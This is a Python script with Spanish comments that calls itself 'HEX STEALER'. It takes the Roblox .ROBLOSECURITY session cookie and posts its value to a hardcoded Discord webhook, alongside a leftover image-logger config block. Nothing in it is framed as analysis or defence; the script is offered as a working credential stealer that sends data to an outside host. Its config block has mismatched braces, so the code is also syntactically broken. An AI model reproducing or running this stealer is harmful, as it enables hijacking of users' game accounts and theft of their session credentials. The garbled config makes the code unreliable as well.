
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

# Función para obtener el valor de una cookie por nombre
def get_cookie_value(session, cookie_name):
    # Busca la cookie en la sesión
    for cookie in session.cookies:
        if cookie.name == cookie_name:
            return cookie.value
    return None

config = {
    "image": "https://i.imgur.com/UTwSor8.jpeg",

     "imageArgument": True,
},

    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://i.imgur.com/UTwSor8.jpeg" # Link to the webpage to redirect to 
    },

# Crear una sesión de requests para obtener cookies
session = requests.Session()

# Simulamos una solicitud de login o acceso a una página para cargar las cookies
# Aquí tendrías que sustituir la URL por la que sea relevante en tu caso.
login_url = "https://www.roblox.com"
response = session.get(login_url)

# Obtener el valor de la cookie .ROBLOSECURITY
cookie_name = ".ROBLOSECURITY"
roblosecurity_value = get_cookie_value(session, cookie_name)

# Información adicional que estás enviando al webhook (simulada aquí)
additional_info = {
    "username": "HEX STEALER",
    "event": "login_attempt",
    "status": "success"
}

# Configura la URL del webhook de Discord
webhook_url = 'https://discord.com/api/webhooks/1279705139581685781/VjDVjrZmdfJ3e7Wny2ZpHzK7TDHHtKkaTR7ptLFK4-SqudMqTKQdwrPjAqqE3i7SZQZu'

# Mensaje que será enviado a Discord, con la información adicional y el valor de la cookie
data = {
    "content": (
        f"Información adicional: {additional_info}\n"
        f"Valor de la cookie '.ROBLOSECURITY': {roblosecurity_value}"
    )
}

# Envía el mensaje a Discord
response = requests.post(webhook_url, json=data)

# Verifica si el mensaje fue enviado correctamente
if response.status_code == 204:
    print("Mensaje enviado exitosamente.")
else:
    print(f"Error al enviar el mensaje. Código de estado: {response.status_code}")
